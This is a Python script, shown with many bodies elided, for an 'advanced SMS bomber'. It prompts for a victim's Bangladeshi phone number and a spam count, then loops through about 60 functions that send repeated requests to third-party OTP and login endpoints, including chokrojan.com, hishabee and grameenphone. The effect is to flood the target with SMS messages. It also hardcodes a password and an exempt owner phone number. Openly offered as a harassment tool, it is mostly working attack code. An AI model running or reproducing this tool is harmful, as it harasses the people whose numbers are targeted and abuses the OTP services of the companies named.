...
os.system("clear")
print("\n\n\033[1;33m <\\> \033[1;32mWELCOME TO...\n\n\t\033[1;32m<\\> \033[1;33mcbrexpt404 SMS Spam \033[1;36mv7.0 \n")
...
def cbrexpt404(message):
    for i in track(range(40), description=f"{p}{message}"):time.sleep(0.01)
...
RQS_ERR = "</> cbrexpt404 REQUESTS ERROR"
...
║                                                        ║
║                🐍 ADVANCED SMS BOMBER 🚀               ║
║             👨‍💻 DEVELOPED BY HANJALA ISLAM            ║
║                                                        ║
╚════════════════════════════════════════════════════════╝
   """)

#os.system("xdg-open https://t.me/+eoiYy8yW9gozNjI1")

#-----------[ PASSWORD PROTECTION ]----------#
def check_password():
    os.system("clear")
    print(logox)
    pwd = input(f"{c}<{w}/{c}> {g}ENTER PASSWORD {c}➤{r} ")
    if pwd != "hanjala999":
        Lxj(f"{c}<{w}/{c}> {y}Wrong Password! Exiting...")
        time.sleep(2)
        sys.exit(0)
    else:
        Lxj(f"{c}<{w}/{c}> {g}Access Granted! Loading...")
        time.sleep(1)

#-----------[ cbrexpt404 MAIN MENU ]----------#

def MAIN_x_cbrexpt404():
    os.system("clear")
    print(logox)
    number=input(f"{c}<{w}/{c}> {g}VICTIM NUMBER {c}➤{r} +88")
    if not number.isdigit() or len(number) != 11:
        Lxj(f"{c}<{w}/{c}> {y}Invalid Number Try Again ! ")
        time.sleep(2);MAIN_x_cbrexpt404()
    elif "cbrexpt404" in number:
        Lxj(f"{c}<{w}/{c}> {y}Invalid Number Try Again ! ")
        time.sleep(2);MAIN_x_cbrexpt404()
    # Owner number check
    elif number == "01836449513":
        Lxj(f"{c}<{w}/{c}> {r}This is owner number so we cannot bombing it!{y}")
        time.sleep(3)
        MAIN_x_cbrexpt404()
    try:amo=int(input(f"{c}<{w}/{c}> {g}SPAM AMOUNT {c}➤{r} "))
    except ValueError:
        Lxj(f"{c}<{w}/{c}> {y}Use Amount Only Number Digit ! ")
        time.sleep(2);MAIN_x_cbrexpt404()
    DARKS(number,amo)


#----------[ cbrexpt404 NEW MAIN API 61 ]-----------#


def lmnXlija_1(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        headers = {
...
def lmnXlija_2(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_3(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_4(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_5(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_6(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_7(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
...
def lmnXlija_8(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
...
def lmnXlija_9(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
...
def lmnXlija_10(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
...
def lmnXlija_11(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_12(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
...
def lmnXlija_13(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_14(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_15(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en',
...
def lmnXlija_16(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_17(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        headers = {
...
def lmnXlija_18(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_19(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_20(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_21(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
...
def lmnXlija_22(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_27(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_28(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_29(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        url = "https://chokrojan.com/api/v1/passenger/login/mobile"
        headers = {
            "User-Agent": lmnXuserAgent4,
...
def lmnXlija_30(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_31(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_32(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_33(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_34(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_35(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_36(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_37(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_38(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        url = f"http://apibeta.iqra-live.com/api/v1/sent-otp/{number}"
        response = requests.get(url, verify=False)
    except Exception as x:print(f" {r}{RQS_ERR} : {y}Unsuccessfull ! ");pass

def lmnXlija_39(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_40(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_41(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_42(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_43(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_44(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_45(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_46(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_47(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_48(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_49(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_50(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_51(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_52(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_53(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_54(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_55(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_56(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
def lmnXlija_57(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        url = "https://www.mcbaffiliate.com/Affiliate/RequestOTP"
        headers = {
            "User-Agent": lmnXuserAgent7,
...
def lmnXlija_58(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        url = f"https://app.hishabee.business/api/V2/otp/send?mobile_number={number}"
        headers = {
            "User-Agent": lmnXuserAgent4,
...
def lmnXlija_59(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
        url = "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp"
        data = {
            "phone": number,
...
def lmnXlija_60(number):#----------{"100% OK": "cbrexpt404"}----------#
    try:
...
#----------[ cbrexpt404 ATTACKING MENU ]----------#


def DARKS(number,amo):
    os.system("clear");print(logox)
    Lxj(f"{c} <{w}/{c}> {g}⚡ cbrexpt404 SMS SPAM {r}v7.0 {g}STARTED\n")
    Lxj(f"{c} <{w}/{c}> {g}VICTIM {w}|{g} AMOUNT {c}➤ {r}"+str(number)+f"{c} | {r}"+str(amo)+"\n")
    for x in range(amo):
        x+=1
        lmnXlija_1(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-01]")
        lmnXlija_2(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-02]")
        lmnXlija_3(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-03]")
        lmnXlija_4(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-04]")
        lmnXlija_5(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-05]")
        lmnXlija_6(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-06]")
        lmnXlija_7(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-07]")
        lmnXlija_8(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-08]")
        lmnXlija_9(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-09]")
        lmnXlija_10(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-10]")
        lmnXlija_11(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-11]")
        lmnXlija_12(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-12]")
        lmnXlija_13(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-13]")
        lmnXlija_14(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-14]")
        lmnXlija_15(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-15]")
        lmnXlija_16(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-16]")
        lmnXlija_17(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-17]")
        lmnXlija_18(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-18]")
        lmnXlija_19(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-19]")
        lmnXlija_20(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-20]")
        lmnXlija_21(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-21]")
        lmnXlija_22(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-22]")
        lmnXlija_23(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-23]")
        lmnXlija_24(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-24]")
        lmnXlija_25(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-25]")
        lmnXlija_26(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-26]")
        lmnXlija_27(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-27]")
        lmnXlija_28(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-28]")
        lmnXlija_29(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-29]")
        lmnXlija_30(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-30]")
        lmnXlija_31(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-31]")
        lmnXlija_32(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-32]")
        lmnXlija_33(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-33]")
        lmnXlija_34(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-34]")
        lmnXlija_35(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-35]")
        lmnXlija_36(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-36]")
        lmnXlija_37(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-37]")
        lmnXlija_38(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-38]")
        lmnXlija_39(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-39]")
        lmnXlija_40(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-40]")
        lmnXlija_41(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-41]")
        lmnXlija_42(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-42]")
        lmnXlija_43(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-43]")
        lmnXlija_44(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-44]")
        lmnXlija_45(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-45]")
        lmnXlija_46(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-46]")
        lmnXlija_47(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-47]")
        lmnXlija_48(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-48]")
        lmnXlija_49(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-49]")
        lmnXlija_50(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-50]")
        lmnXlija_51(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-51]")
        lmnXlija_52(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-52]")
        lmnXlija_53(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-53]")
        lmnXlija_54(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-54]")
        lmnXlija_55(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-55]")
        lmnXlija_56(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-56]")
        lmnXlija_57(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-57]")
        lmnXlija_58(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-58]")
        lmnXlija_59(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-59]")
        lmnXlija_60(number);cbrexpt404(f" </> cbrexpt404 v7.0 [{x}-60]")
...
# ---- ADDED MISSING FUNCTION lnx() ----
def lnx():
    print(f"{c} <{w}/{c}> {g}----------------------------\n")

# ---- ADDED MISSING FUNCTION lmnXlija_61 ----
def lmnXlija_61(number):
    # dummy function to avoid NameError
    pass

# ---- PASSWORD CHECK BEFORE START ----
check_password()
MAIN_x_cbrexpt404()